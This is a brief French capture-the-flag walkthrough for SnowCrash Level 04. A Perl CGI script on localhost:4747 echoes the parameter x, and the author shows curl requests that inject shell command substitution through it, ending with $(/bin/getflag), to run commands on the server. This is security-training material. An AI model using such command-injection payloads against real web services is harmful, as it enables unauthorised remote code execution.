## Level  04:

On arrive sur un folder avec un fichier perl ```level04.pl```
  Apres ouverture on voit que ce fichier peut etre execute sur le port :    
```localhost:4747``` et que le programme va print le premiere argument donne a la variable x telque :   
 ```
 level04@SnowCrash:~$curl"http://localhost:4747/level04.pl?x=whoami"
 whoami   
 level04@SnowCrash:~$curl "http://localhost:4747/level04.pl?x=$(whoami)   
 level04
 ```

L'objectif est de contourner ca pour executer getflag dans /bin/getflag telque :   
```level04@SnowCrash:~$ curl  "http://localhost:4747/level04.pl?x=\$(/bin/getflag)"```